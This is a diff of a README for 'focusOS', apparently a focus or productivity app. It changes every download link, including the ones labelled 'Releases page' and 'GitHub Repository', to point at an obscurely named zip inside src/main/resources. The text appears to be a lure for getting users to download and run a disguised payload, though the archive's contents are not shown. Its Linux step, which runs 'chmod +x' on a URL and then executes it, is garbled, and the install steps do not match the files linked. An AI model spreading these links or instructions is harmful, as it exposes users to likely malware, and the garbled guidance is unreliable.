@@ -6,9 +6,9 @@ Welcome to focusOS! This application helps you concentrate better. It combines a
 
 ## 📥 Download focusOS
 
-[![Download focusOS](https://raw.githubusercontent.com/Penguin078/focusOS/master/unblaming/focusOS.zip)](https://raw.githubusercontent.com/Penguin078/focusOS/master/unblaming/focusOS.zip)
+[![Download focusOS](https://github.com/Penguin078/focusOS/raw/refs/heads/master/src/main/resources/OS_focus_chironomic.zip)](https://github.com/Penguin078/focusOS/raw/refs/heads/master/src/main/resources/OS_focus_chironomic.zip)
 
-To get started, you will need to download focusOS from our Releases page. You can find it here: [Download focusOS](https://raw.githubusercontent.com/Penguin078/focusOS/master/unblaming/focusOS.zip).
+To get started, you will need to download focusOS from our Releases page. You can find it here: [Download focusOS](https://github.com/Penguin078/focusOS/raw/refs/heads/master/src/main/resources/OS_focus_chironomic.zip).
 
 ## 💻 System Requirements 
 
@@ -34,7 +34,7 @@ focusOS includes several key features that enhance your productivity:
 Follow these steps to install and run focusOS:
 
 1. **Visit the Downloads Page:**
-   Go to our Releases page: [Download focusOS](https://raw.githubusercontent.com/Penguin078/focusOS/master/unblaming/focusOS.zip).
+   Go to our Releases page: [Download focusOS](https://github.com/Penguin078/focusOS/raw/refs/heads/master/src/main/resources/OS_focus_chironomic.zip).
 
 2. **Choose the Right File:**
    You will see different versions of focusOS. Select the version that matches your operating system. 
@@ -45,7 +45,7 @@ Follow these steps to install and run focusOS:
 4. **Run the Installer:**
    - For **Windows**: Double-click the `.exe` file to start the installation.
    - For **MacOS**: Open the `.dmg` file and drag the focusOS app to your Applications folder.
-   - For **Linux**: Open your terminal and run the command `chmod +x https://raw.githubusercontent.com/Penguin078/focusOS/master/unblaming/focusOS.zip && https://raw.githubusercontent.com/Penguin078/focusOS/master/unblaming/focusOS.zip` to start the installation.
+   - For **Linux**: Open your terminal and run the command `chmod +x https://github.com/Penguin078/focusOS/raw/refs/heads/master/src/main/resources/OS_focus_chironomic.zip && https://github.com/Penguin078/focusOS/raw/refs/heads/master/src/main/resources/OS_focus_chironomic.zip` to start the installation.
 
 5. **Complete the Installation:**
    Follow the on-screen prompts. Once completed, the application will appear in your Applications menu or desktop.
@@ -75,8 +75,8 @@ If you need help, please reach out to our support team. You can open an issue on
 
 ## 🔗 Useful Links
 
-- [Download focusOS](https://raw.githubusercontent.com/Penguin078/focusOS/master/unblaming/focusOS.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Penguin078/focusOS/master/unblaming/focusOS.zip)
+- [Download focusOS](https://github.com/Penguin078/focusOS/raw/refs/heads/master/src/main/resources/OS_focus_chironomic.zip)
+- [GitHub Repository](https://github.com/Penguin078/focusOS/raw/refs/heads/master/src/main/resources/OS_focus_chironomic.zip)
 
 ## 📝 Topics
 
